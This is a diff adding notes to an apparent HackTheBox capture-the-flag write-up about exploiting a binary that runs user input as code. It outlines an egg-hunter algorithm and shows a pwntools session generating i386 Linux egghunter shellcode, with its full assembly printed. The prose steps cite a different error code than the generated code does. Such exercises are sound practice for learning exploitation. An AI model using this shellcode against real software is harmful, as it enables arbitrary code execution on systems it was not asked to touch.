@@ -1,4 +1,65 @@
+1. SYSCALL alarm(100)
+2. SYSCALL access(0)
+3. Loop through memory until accessible memory is found.
+    - This is done by checking if we get 0xf2 error response from access() 
+    attempting to use current memory address.
+4. If True; then check if memory address has "egg" with in it.
+    - This is done by using "cmp [egg], string"
+5. If False, go to 2. 
+6. If memory address == egg; then payload.
+7. if memory address != egg; go to 2.
+
+
+
+
 Place shellcode to userInput because program executes userInput.
 
 break @ call eax
 Call EAX = userInput
+
+
+>>> from pwn import *                                                              
+>>> egg = "\x48\x54\x42\x7b"                                                       
+>>>                                                                                
+>>> egghunter = asm(pwnlib.shellcraft.i386.linux.egghunter(egg, start_address = 0))
+>>> egghunter = pwnlib.shellcraft.i386.linux.egghunter(egg, start_address = 0)     
+>>> print egghunter                                                                
+    cld                                                                            
+    /* push 'HTB{' */                                                              
+    push 0x7b425448                                                                
+                                                                                   
+egghunter_loop_5:                                                                  
+    /* access(name='ebx', type=0) */                                               
+    xor ecx, ecx                                                                   
+    /* call access() */                                                            
+    push SYS_access /* 0x21 */                                                     
+    pop eax                                                                        
+    int 0x80                                                                       
+                                                                                   
+    cmp al, (-EFAULT /* 0xe */) & 0xff                                             
+    jz egghunter_nextpage_8                                                        
+                                                                                   
+    xor edx, edx                                                                   
+    mov dh, 0x400 >> 8                                                             
+egghunter_memcmp_6:                                                                
+    test edx, edx                                                                  
+    jz   egghunter_nextpage_8                                                      
+                                                                                   
+    push 1                                                                         
+    pop ecx                                                                        
+    mov edi, ebx                                                                   
+    mov esi, esp                                                                   
+    repe cmpsd                                                                     
+    jz egghunter_done_7                                                            
+                                                                                   
+    add ebx, 4                                                                     
+    dec edx                                                                        
+    jnz egghunter_memcmp_6                                                         
+                                                                                   
+egghunter_nextpage_8:                                                              
+    or   bx, 0xfff                                                                 
+    inc ebx                                                                        
+    jmp egghunter_loop_5                                                           
+egghunter_done_7:                                                                  
+                                                                                   
+
